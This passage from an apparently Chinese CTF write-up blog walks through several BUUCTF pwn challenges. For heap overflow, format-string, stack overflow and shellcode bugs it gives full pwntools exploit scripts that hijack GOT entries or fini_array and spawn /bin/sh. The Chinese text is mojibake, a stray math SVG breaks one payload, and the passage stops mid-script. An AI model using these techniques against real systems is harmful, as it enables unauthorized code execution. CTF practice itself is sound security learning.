<p>è€Œæ‰“å°å‡½æ•°ï¼Œè®¤çœŸçœ‹ï¼Œæ˜¯printfå‡½æ•°ï¼Œ%sï¼Œé‚£ä¹ˆè¿™æ˜¯ä¼šè§£æä¸€ä¸ªåœ°å€ï¼Œç„¶åæŠŠè¿™ä¸ªåœ°å€ä¸Šçš„å†…å®¹æ‰“å°å‡ºæ¥ï¼Œæ‰€ä»¥æˆ‘ä»¬é€šè¿‡æº¢å‡ºæŠŠfreeçš„gotè¡¨åœ°å€å†™ä¸Šå»ï¼Œé‚£ä¹ˆè§£æå®Œæ‰“å°å‡ºæ¥çš„å°±æ˜¯freeçš„çœŸå®åœ°å€ï¼Œä»è€Œè·å¾—libcåŸºå€</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210827143043150.png" alt="image-20210827143043150"></p>
<p>åŒæ ·ï¼Œè¿™è¾¹ä¿®æ”¹descriptionçš„å‡½æ•°ï¼Œä¹Ÿæ˜¯ä¼šæŠŠdescriptionçš„åœ°å€ä¼ å…¥è¿›å»ä¿®æ”¹ï¼Œé‚£ä¹ˆåªéœ€è¦å¯¹ç€å‰é¢å·²ç»å†™å…¥freeçš„gotè¡¨åœ°å€çš„å †å—è¿›è¡Œè¿™ä¸ªæ“ä½œï¼Œå°±èƒ½æŠŠsystemå‡½æ•°å†™è¿›å»ï¼Œä»è€ŒåŠ«æŒgotè¡¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&#x27;./babyfengshui_33c3_2016&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/libc-2.23.so&quot;</span>)<br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.23-0ubuntu11.2_i386/ld-2.23.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&#x27;node4.buuoj.cn&#x27;, 27980)</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Add</span>(<span class="hljs-params">size, length, text</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;0&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;description: &quot;</span>, <span class="hljs-built_in">str</span>(size))<br>	p.sendlineafter(<span class="hljs-string">&quot;name: &quot;</span>, <span class="hljs-string">&#x27;qin&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;length: &quot;</span>, <span class="hljs-built_in">str</span>(length))<br>	p.sendlineafter(<span class="hljs-string">&quot;text: &quot;</span>, text)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Del</span>(<span class="hljs-params">index</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;1&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Dis</span>(<span class="hljs-params">index</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;2&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">Upd</span>(<span class="hljs-params">index, length, text</span>):</span><br>	p.sendlineafter(<span class="hljs-string">&quot;Action: &quot;</span>, <span class="hljs-string">&#x27;3&#x27;</span>)<br>	p.sendlineafter(<span class="hljs-string">&quot;index: &quot;</span>, <span class="hljs-built_in">str</span>(index))<br>	p.sendlineafter(<span class="hljs-string">&quot;length: &quot;</span>, <span class="hljs-built_in">str</span>(length))<br>	p.sendlineafter(<span class="hljs-string">&quot;text: &quot;</span>, text)<br><br>Add(<span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;qin&#x27;</span>)<br>Add(<span class="hljs-number">0x80</span>, <span class="hljs-number">0x80</span>, <span class="hljs-string">&#x27;qin&#x27;</span>)<br>Add(<span class="hljs-number">0x8</span>, <span class="hljs-number">0x8</span>, <span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br><br>Del(<span class="hljs-number">0</span>)<br>Add(<span class="hljs-number">0x100</span>,<span class="hljs-number">0x19c</span>,<span class="hljs-string">&quot;a&quot;</span>*<span class="hljs-number">0x198</span>+p32(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]))<br>gdb.attach(p)<br>Dis(<span class="hljs-number">1</span>)<br><br>p.recvuntil(<span class="hljs-string">&quot;description: &quot;</span>)<br>free_addr = u32(p.recv(<span class="hljs-number">4</span>))<br><br>libc = LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>, free_addr)<br>libc_base = free_addr - libc.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br>sys_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>Upd(<span class="hljs-number">1</span>, <span class="hljs-number">0x4</span>, p32(sys_addr))<br>Del(<span class="hljs-number">2</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>



<h2 id="äº”ã€axb-2019-fmt32"><a href="#äº”ã€axb-2019-fmt32" class="headerlink" title="äº”ã€axb_2019_fmt32"></a>äº”ã€axb_2019_fmt32</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210824223244646.png" alt="image-20210824223244646"></p>
<p>æƒ¯ä¾‹checksecï¼Œ32ä½ï¼Œå¼€äº†NX</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210824225801805.png" alt="image-20210824225801805"></p>
<p>IDAé‡Œé¢å¾ˆæ˜æ˜¾çš„å°±æ˜¯ç»™äº†æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œé¢˜ç›®ä¹Ÿæš—ç¤ºäº†ã€‚ä½†æ˜¯ç”±äºç¨‹åºå†…å¾ˆå¹²å‡€ï¼Œæ²¡æœ‰ä»€ä¹ˆå…¶ä»–å‡½æ•°ï¼Œé‚£è¦getshellï¼Œå°±å¾—å…ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²æ³„éœ²å‡ºlibcï¼Œå†å€Ÿç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²å†™åˆ°æ ˆä¸Šï¼Œæˆ‘æƒ³äº†ä¸€ä¸‹ï¼Œæ ˆè¿˜è¦å†æ³„éœ²å‡ºæ ˆåœ°å€ï¼Œä¹Ÿå¯ä»¥å®ç°ï¼ˆå› ä¸ºæœ‰ä¸ªå‡½æ•°environå°±æ˜¯å­˜äº†æ ˆåœ°å€çš„ï¼‰ï¼Œæ‰€ä»¥è¿™è¾¹æˆ‘è½¬å¿µæƒ³åˆ°åŠ«æŒgotè¡¨å°±ä¸è¦è¿™ä¹ˆéº»çƒ¦ï¼Œgotåœ°å€åˆæ˜¯ç›´æ¥å·²çŸ¥çš„</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210824225741699.png" alt="image-20210824225741699"></p>
<p>ç„¶åå…ˆè®¡ç®—åç§»ï¼Œè¿™è¾¹å¯ä»¥çœ‹è§ï¼Œæˆ‘æ˜¯è¾“å…¥äº†4ä¸ªaçš„ï¼Œä½†æ˜¯å¾ˆæ˜æ˜¾æ˜¯æ²¡æœ‰å¯¹é½çš„ï¼Œæ‰€ä»¥ä¹‹åå†™payloadçš„æ—¶å€™ï¼Œè¦å…ˆè¡¥é½ä¸€ä¸ªå­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„åç§»ä»ç¬¬å…«ä¸ªå¼€å§‹</p>
<p>ç„¶åè¿™é¢˜æ˜¯æœ‰é™æ—¶çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åˆ©ç”¨%x$nçš„æ—¶å€™ï¼Œåˆ†ä¸¤æ¬¡åŠ«æŒï¼Œå†™æˆhnï¼ˆå¦‚æœhnä¹Ÿè¶…æ—¶ï¼Œé‚£å°±hhnï¼‰ï¼Œè¿™æ ·è¾“å…¥æ›´å¿«æ·ã€‚ä¸ç„¶ä¼štimeout</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210825001757873.png" alt="image-20210825001757873"></p>
<p>æœ€åå°±æ˜¯é€‰æ‹©åŠ«æŒstrlenï¼Œåˆšå¼€å§‹æ˜¯åŠ«æŒprintfçš„ï¼Œä½†æ˜¯å¯èƒ½æ˜¯å› ä¸ºåœ¨ä¹‹å‰æœ‰ä¸ªåœ°æ–¹å·²ç»è°ƒç”¨äº†printfæ‰“å°ä¸€å¥è¯å¯¼è‡´å‡ºé”™ï¼Œç„¶åè¿™è¾¹åŠ«æŒçš„æ—¶å€™ï¼Œè¦åœ¨/bin/shå‰åŠ ä¸Šåˆ†å·ï¼Œå› ä¸ºæˆ‘ä»¬è¾“å…¥çš„åœ°æ–¹å‰é¢å…¶å®å·²ç»æœ‰ä¸€ä¸²å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥è¦åˆ†éš”å¼€ï¼Œæ‰èƒ½è¯†åˆ«å‡º/bin/sh</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210825002000682.png" alt="image-20210825002000682"></p>
<p>expï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27607</span>)<br><span class="hljs-comment">#p = process(&#x27;./axb_2019_fmt32&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>elf = ELF(<span class="hljs-string">&quot;./axb_2019_fmt32&quot;</span>)<br>printf_got = elf.got[<span class="hljs-string">&quot;printf&quot;</span>]<br>strlen_got = elf.got[<span class="hljs-string">&quot;strlen&quot;</span>]<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.recvuntil(<span class="hljs-string">&quot;tell me:&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> + p32(printf_got) + <span class="hljs-string">&quot;xxxx&quot;</span> <span class="hljs-string">&quot;%8$s&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;xxxx&quot;</span>)<br>printf = u32(p.recv(<span class="hljs-number">4</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;read--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(printf))<br>sys = printf - <span class="hljs-number">0xe6e0</span><br>sys_high = (sys &gt;&gt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xFFFF</span><br>sys_low =  (sys) &amp; <span class="hljs-number">0xFFFF</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;sys--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(sys))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;low--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(sys_low))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;high--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(sys_high))<br>p.recvuntil(<span class="hljs-string">&quot;tell me:&quot;</span>)<br>payload = <span class="hljs-string">&#x27;a&#x27;</span> + p32(strlen_got) + p32(strlen_got+<span class="hljs-number">2</span>) + <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(sys_low - <span class="hljs-number">18</span>) + <span class="hljs-string">&quot;c%8<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="7.679ex" height="2.676ex" style="vertical-align: -0.505ex;" viewbox="0 -934.9 3306.4 1152.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">hn" + '%' +str(sys_high - sys_low) +"c%9</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-68" d="M137 683Q138 683 209 688T282 694Q294 694 294 685Q294 674 258 534Q220 386 220 383Q220 381 227 388Q288 442 357 442Q411 442 444 415T478 336Q478 285 440 178T402 50Q403 36 407 31T422 26Q450 26 474 56T513 138Q516 149 519 151T535 153Q555 153 555 145Q555 144 551 130Q535 71 500 33Q466 -10 419 -10H414Q367 -10 346 17T325 74Q325 90 361 192T398 345Q398 404 354 404H349Q266 404 205 306L198 293L164 158Q132 28 127 16Q114 -11 83 -11Q69 -11 59 -2T48 16Q48 30 121 320L195 616Q195 629 188 632T149 637H128Q122 643 122 645T124 664Q129 683 137 683Z"/>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"/>
<path stroke-width="1" id="E1-MJMAIN-22" d="M34 634Q34 659 50 676T93 694Q121 694 144 668T168 579Q168 525 146 476T101 403T73 379Q69 379 60 388T50 401Q50 404 62 417T88 448T116 500T131 572Q131 584 130 584T125 581T112 576T94 573Q69 573 52 590T34 634ZM238 634Q238 659 254 676T297 694Q325 694 348 668T372 579Q372 525 350 476T305 403T277 379Q273 379 264 388T254 401Q254 404 266 417T292 448T320 500T335 572Q335 584 334 584T329 581T316 576T298 573Q273 573 256 590T238 634Z"/>
<path stroke-width="1" id="E1-MJMAIN-2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"/>
<path stroke-width="1" id="E1-MJMAIN-2032" d="M79 43Q73 43 52 49T30 61Q30 68 85 293T146 528Q161 560 198 560Q218 560 240 545T262 501Q262 496 260 486Q259 479 173 263T84 45T79 43Z"/>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-68" x="0" y="0"/>
 <use xlink:href="#E1-MJMATHI-6E" x="576" y="0"/>
 <use xlink:href="#E1-MJMAIN-22" x="1454" y="0"/>
<g transform="translate(2233,0)">
 <use xlink:href="#E1-MJMAIN-2B" x="0" y="0"/>
 <use transform="scale(0.707)" xlink:href="#E1-MJMAIN-2032" x="1100" y="583"/>
</g>
</g>
</svg>hn&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;tell me:&quot;</span>)<br>payload= <span class="hljs-string">&quot;;/bin/sh\x00&quot;</span><br>p.send(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="å…­ã€bbys-tu-2016"><a href="#å…­ã€bbys-tu-2016" class="headerlink" title="å…­ã€bbys_tu_2016"></a>å…­ã€bbys_tu_2016</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151052237.png" alt="image-20210826151052237"></p>
<p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ32ä½ï¼Œå¼€äº†NX</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151038100.png" alt="image-20210826151038100"></p>
<p>è¿›å…¥IDAï¼Œå‘ç°æœ‰ä¸ªåé—¨å‡½æ•°ï¼Œå¹¶ä¸”ä¸»å‡½æ•°ååˆ†ç®€å•ï¼Œå°±ç»™äº†ä¸ªå¾ˆæ˜æ˜¾çš„æº¢å‡ºï¼Œé‚£å°±ç›´æ¥è·³è½¬åˆ°åé—¨å‡½æ•°å³å¯</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826150923013.png" alt="image-20210826150923013"></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151009378.png" alt="image-20210826151009378"></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151024405.png" alt="image-20210826151024405"></p>
<p>è¿™è¾¹å°±æ˜¯IDAé‡Œé¢çš„æº¢å‡ºä¸å¯¹ï¼Œæ‰€ä»¥è¦å»gdbé‡Œé¢åŠ¨æ€è°ƒè¯•è®¡ç®—åç§»æ‰è¡Œ</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151210436.png" alt="image-20210826151210436"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27835</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>payload = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x18</span> + p32(<span class="hljs-number">0x804856D</span>)<br>p.sendline(payload) <br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="ä¸ƒã€pwnable-start"><a href="#ä¸ƒã€pwnable-start" class="headerlink" title="ä¸ƒã€pwnable_start"></a>ä¸ƒã€pwnable_start</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151445256.png" alt="image-20210826151445256"></p>
<p>å¸¸è§„checksecï¼Œ32ä½ï¼Œä»€ä¹ˆä¿æŠ¤éƒ½æ²¡å¼€</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151616994.png" alt="image-20210826151616994"></p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826151627593.png" alt="image-20210826151627593"></p>
<p>è¿›å…¥IDAï¼Œåªå­˜åœ¨startï¼Œå¹¶æ²¡æœ‰mainå‡½æ•°ï¼Œåªèƒ½çœ‹æ±‡ç¼–</p>
<p>é€šè¿‡ç›´æ¥çœ‹æ±‡ç¼–ï¼Œæˆ–è€…è¿›è¡Œgdbè°ƒè¯•ï¼Œéƒ½èƒ½è·å¾—è¾“å…¥ç‚¹è·ç¦»è¿”å›åœ°å€é•¿åº¦ä¸º0x14</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826165108914.png" alt="image-20210826165108914"></p>
<p>åœ¨gdbé‡Œé¢å¯ä»¥å‘ç°ï¼Œå½“æ‰§è¡Œåˆ°retï¼ŒespæŒ‡å‘çš„åœ°æ–¹å­˜ç€ä¸€ä¸ªæ ˆä¸Šçš„åœ°å€ï¼Œæ‰€ä»¥å¯ä»¥æ®æ­¤ï¼Œæˆ‘ä»¬å…ˆè·³è½¬åˆ°wirteå‡½æ•°ï¼ŒæŠŠespæŒ‡å‘çš„åœ°æ–¹è¾“å‡ºå‡ºæ¥ï¼Œä»è€Œè·å¾—æ ˆä¸Šåœ°å€ã€‚</p>
<p>ç„¶åï¼Œå› ä¸ºè·³è½¬ç¨‹åºï¼ŒåŒæ ·ä¼šå†æ¬¡æ‰§è¡Œreadï¼Œæ­¤æ—¶æˆ‘ä»¬è¾“å…¥çš„æ ˆåœ°å€æ¯”æˆ‘ä»¬æ³„éœ²çš„æ ˆåœ°å€åˆšå¥½å°‘4ä¸ªå­—èŠ‚ï¼Œå› ä¸ºæœ€åéƒ½ä¼šæ‰§è¡Œåˆ°add esp,0x14ï¼Œæ‰€ä»¥åç§»ä»ç„¶æ˜¯0x14ï¼Œå†è§£é‡Šä¸‹ä¸ºä»€ä¹ˆespè·ç¦»æˆ‘ä»¬å†™å…¥çš„/bin/sh\x00ä¼šå·®0x18ï¼Œæ˜¯å› ä¸ºæ‰§è¡Œretæ—¶ï¼Œä¼šæ‰§è¡Œpopï¼Œæ‰€ä»¥ä¼šå¤š4ä¸ªå­—èŠ‚</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826173800838.png" alt="image-20210826173800838"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">26799</span>)<br><span class="hljs-comment">#p = process(&#x27;./start&#x27;)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.recvuntil(<span class="hljs-string">&quot;CTF:&quot;</span>)<br>shellcode = <span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x14</span> + p32(<span class="hljs-number">0x08048087</span>)<br>p.send(shellcode)<br>addr = u32(p.recv(<span class="hljs-number">4</span>))<br>log.success(<span class="hljs-built_in">hex</span>(addr))<br><br>shellcode = <span class="hljs-string">&quot;/bin/sh\x00&quot;</span> + <span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x14</span>-<span class="hljs-number">8</span>) +p32(addr+<span class="hljs-number">0x14</span>)<br>shellcode += asm(<span class="hljs-string">&quot;lea ebx,[esp-0x18]&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;mov eax,0xb&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;xor ecx,ecx&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;xor edx,edx&quot;</span>)<br>shellcode += asm(<span class="hljs-string">&quot;int 0x80&quot;</span>)<br>p.send(shellcode)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h2 id="å…«ã€picoctf-2018-echo-back"><a href="#å…«ã€picoctf-2018-echo-back" class="headerlink" title="å…«ã€picoctf_2018_echo_back"></a>å…«ã€picoctf_2018_echo_back</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826182247503.png" alt="image-20210826182247503"></p>
<p>å¸¸è§„checksecä¸€ä¸‹ï¼Œ32ä½ï¼Œå¼€äº†NXã€Canary</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826182506261.png" alt="image-20210826182506261"></p>
<p>è¿›å…¥IDAï¼Œå¾ˆæ˜æ˜¾çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œè·Ÿè¿™ç¯‡æ–‡ç« çš„ç¬¬äº”é¢˜æ¯”è¾ƒç›¸ä¼¼ã€‚ä½†æ˜¯å°‘äº†å¾ªç¯ï¼Œå¤šäº†systemå‡½æ•°è°ƒç”¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨åŠ«æŒgotè¡¨æ—¶éœ€è¦è®©ç¨‹åºèƒ½å†æ‰§è¡Œä¸€æ¬¡vulnå‡½æ•°ï¼Œè®©æˆ‘ä»¬èƒ½è¾“å…¥/bin/sh\x00ï¼Œä¸éœ€è¦æ³„éœ²libcåŸºå€</p>
<p>å› ä¸ºåé¢æœ‰æ‰§è¡Œputså‡½æ•°ï¼Œé‚£å¯ä»¥æŠŠputsçš„gotè¡¨ä¿®æ”¹ä¸ºvulnå‡½æ•°çš„èµ·å§‹åœ°å€</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826191303201.png" alt="image-20210826191303201"></p>
<p>åç§»æ˜¯7</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826184836372.png" alt="image-20210826184836372"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27830</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>printf_got = <span class="hljs-number">0x0804A010</span><br>sys_plt = <span class="hljs-number">0x08048460</span><br>puts_got = <span class="hljs-number">0x0804A01C</span><br>vuln = <span class="hljs-number">0x080485AB</span><br><br>p.recvuntil(<span class="hljs-string">&quot;message:&quot;</span>)<br>payload = p32(printf_got+<span class="hljs-number">2</span>) + p32(puts_got+<span class="hljs-number">2</span>) + p32(printf_got) + p32(puts_got) <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x804</span>-<span class="hljs-number">0x10</span>) + <span class="hljs-string">&quot;c%7$hn&quot;</span><br>payload += <span class="hljs-string">&quot;%8$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x8460</span>-<span class="hljs-number">0x804</span>) + <span class="hljs-string">&quot;c%9$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x85AB</span>-<span class="hljs-number">0x8460</span>) + <span class="hljs-string">&quot;c%10$hn&quot;</span><br>p.send(payload)<br>p.recvuntil(<span class="hljs-string">&quot;message:&quot;</span>)<br>p.send(<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></table></figure>





<h2 id="ä¹ã€ciscn-2019-sw-1"><a href="#ä¹ã€ciscn-2019-sw-1" class="headerlink" title="ä¹ã€ciscn_2019_sw_1"></a>ä¹ã€ciscn_2019_sw_1</h2><p><img src="/2021/08/12/2021-08-12-buu07/image-20210826194736365.png" alt="image-20210826194736365"></p>
<p>å¸¸è§„checksecï¼Œ32ä½ï¼Œå¼€äº†NX</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826194146179.png" alt="image-20210826194146179"></p>
<p>è¿›å…¥IDAï¼Œè¿™é¢˜ä¹Ÿæ˜¯ä¸€é“æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œè€Œä¸”ä»”ç»†çœ‹ï¼Œè·Ÿç¬¬å…«é¢˜å‡ ä¹ä¸€æ ·ï¼Œå¹¶ä¸”ä¹Ÿæ˜¯å­˜åœ¨è°ƒç”¨äº†systemå‡½æ•°ï¼Œä¸éœ€è¦æ³„éœ²</p>
<p><img src="/2021/08/12/2021-08-12-buu07/image-20210826195039322.png" alt="image-20210826195039322"></p>
<p>åç§»ä¸º4</p>
<p>è¿™è¾¹å› ä¸ºprintfåç»­ä¹Ÿæ²¡åˆ«çš„å‡½æ•°ï¼Œæ‰€ä»¥è¦è®©ç¨‹åºå†æ‰§è¡Œä¸€æ¬¡å°±è¦å»æ‰¾åœ¨printfä¹‹åï¼Œç¨‹åºè¿˜è°ƒç”¨äº†ä»€ä¹ˆä¸œè¥¿ï¼Œç„¶åå»æŠŠè¿™ä¸ªä¿®æ”¹ä¸ºmainå‡½æ•°åœ°å€</p>
<p>linuxä¸­åœ¨ç¨‹åºç»“æŸçš„æ—¶å€™ï¼Œä¾æ¬¡è°ƒç”¨<code>fini.array</code>ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚æ‰€ä»¥è¿™è¾¹æŠŠfini.arrayä¸­çš„å‡½æ•°æŒ‡é’ˆæ”¹å†™ä¸ºmainå‡½æ•°åœ°å€</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">27862</span>)<br><span class="hljs-comment">#p = process(&#x27;./1&#x27;)</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>printf_got = <span class="hljs-number">0x0804989C</span><br>system_plt = <span class="hljs-number">0x080483D0</span><br>fini = <span class="hljs-number">0x0804979C</span><br>main = <span class="hljs-number">0x8048534</span><br><br>p.recvuntil(<span class="hljs-string">&quot;name?&quot;</span>)<br>payload = p32(printf_got+<span class="hljs-number">2</span>) + p32(fini+<span class="hljs-number">2</span>) + p32(printf_got) + p32(fini) <br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x804</span>-<span class="hljs-number">0x10</span>) + <span class="hljs-string">&quot;c%4$hn&quot;</span><br>payload += <span class="hljs-string">&quot;%5$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span class="hljs-number">0x83D0</span>-<span class="hljs-number">0x804</span>) + <span class="hljs-string">&quot;c%6$hn&quot;</span><br>payload += <span class="hljs-string">&#x27;%&#x27;</span> + <span class="hljs-built_in">str</span>(<span 